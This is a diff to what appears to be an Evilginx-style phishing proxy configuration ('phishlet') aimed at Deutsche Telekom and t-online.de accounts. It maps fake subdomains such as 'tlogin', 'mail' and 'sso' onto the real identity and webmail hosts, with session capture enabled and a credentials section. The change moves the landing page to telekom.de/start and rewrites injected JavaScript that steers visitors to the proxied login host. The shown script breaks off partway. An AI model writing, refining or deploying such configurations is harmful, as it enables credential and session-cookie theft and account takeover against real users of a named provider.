@@ -5,9 +5,9 @@ min_ver: "3.0.0"
 proxy_hosts:
   - {phish_sub: "tlogin", orig_sub: "accounts.login", domain: "idm.telekom.com", session: true, is_landing: false, auto_filter: false}
   - {phish_sub: "acctidm", orig_sub: "account", domain: "idm.telekom.com", session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: "portal", orig_sub: "www", domain: "t-online.de", session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: "portal", orig_sub: "www", domain: "t-online.de", session: true, is_landing: false, auto_filter: false}
   - {phish_sub: "mail", orig_sub: "email", domain: "t-online.de", session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: "tkde", orig_sub: "www", domain: "telekom.de", session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: "tkde", orig_sub: "www", domain: "telekom.de", session: true, is_landing: true, auto_filter: false}
   - {phish_sub: "idm", orig_sub: "idm", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
   - {phish_sub: "sso", orig_sub: "sso", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
   - {phish_sub: "acct", orig_sub: "accounts", domain: "telekom.com", session: true, is_landing: false, auto_filter: false}
@@ -179,18 +179,19 @@ credentials:
       type: "json"
 
 login:
-  domain: "www.t-online.de"
-  path: "/"
+  domain: "www.telekom.de"
+  path: "/start"
 
 js_inject:
-  - trigger_domains: ["www.t-online.de"]
-    trigger_paths: ["/"]
+  - trigger_domains: ["www.telekom.de"]
+    trigger_paths: ["/start", "/"]
     trigger_params: []
     script: |
       window.addEventListener('load', function() {
         var parts = window.location.hostname.split('.');
         parts[0] = 'tlogin';
-        var tloginHost = parts.join('.');
+        var base = parts.slice(1).join('.');
+        var tloginHost = 'tlogin.' + base.replace('telekom.de', 'idm.telekom.com');
         function uuid() {
           var a = '';
           for (var i = 0; i < 32; i++) a += Math.floor(Math.random() * 16).toString(16);
